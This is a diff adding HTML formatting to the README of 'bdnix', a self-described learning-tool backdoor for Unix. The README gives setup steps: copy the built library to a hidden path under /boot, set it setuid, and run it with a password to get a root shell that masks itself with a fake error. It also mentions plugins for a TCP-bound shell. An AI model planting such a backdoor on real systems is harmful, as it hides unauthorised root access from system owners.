@@ -1,4 +1,5 @@
-  ___ ___  _  _ _____  __
+ <pre>
+ ___ ___  _  _ _____  __
  | _ )   \| \| |_ _\ \/ /
  | _ \ |) | .` || | >  < 
  |___/___/|_|\_|___/_/\_\
@@ -6,27 +7,29 @@
 Trivial userspace backdoor for Unix
 Emanuele Paiano - nixw0rm@gmail.com
 
-This is a learning tool, so use it ONLY on your home systems (like 
+</pre>
+
+<h3>This is a learning tool, so use it ONLY on your home systems (like 
 Desktop PC or Raspberry Pi). I'm not responsable for abuses. 
-Use it at your risk!                           
+Use it at your risk!  </h3>                         
 
 ------------------
  GETTING STARTED
 ------------------
 
 1) Open root terminal in current directory and go into bdnix folder
-
+  <pre>
    # cd /path/bdnix
-
+   </pre>
 2) From root run 'make' to build binary file
-
+  <pre>
    # make
-
+   </pre>
 3) copy created file (i.e. libbd.so) with -p option to a hidden location like /bin, /etc,
-
+<pre>
    # cp -p libbd.so /boot/.libbd.so
    # chmod +sx /boot/.libbd.so
-        
+   </pre>       
    and setuid file (chmod +x).
 
 
@@ -34,34 +37,34 @@ Use it at your risk!
 
 
 5) Run binary with joshua to enable backdoor
-
+<pre>
    $ /boot/.libbd.so joshua /bin/sh
 
    if you see '#' then.. you are root! :)
-
+   </pre>
 
 6) if you run without joshua password, you can read a (fake) error:
-
+<pre>
    /bin/sh: cannot execute binary file
-
+   </pre>
 
 ---------------------
  CUSTOMIZE PASSWORD
 ---------------------
 
 Opening settings.h you can change default password "joshua" (can you remember WOPR?):
-
+<pre>
         #define ARG1 "joshua"
-
+        </pre>
 we can change it to "chips"
-
+<pre>
         #define ARG1 "chips"
-
+</pre>
 Now recompiling (read above) and running with new password:
-
+<pre>
         $ /boot/.libbd.so chips /bin/sh
         #
-
+</pre>
 If we have rootshell, it works! :)
 
 
@@ -73,12 +76,12 @@ add new functionaties to bdnix (i.e. binding shell on TCP port, loading kernel m
 To enable a plugin:
 
 1) Open settings.h include file and search for options like:
-
+<pre><code>
         /* PLUGINS */
 
         /* enable rootshell */
         #define SHELL 1
-        
+        </code></pre>       
 2) Change 1 to enable, or 0 to disable code.
 
 Example. If you have rootshell disabled and myplugin enabled:
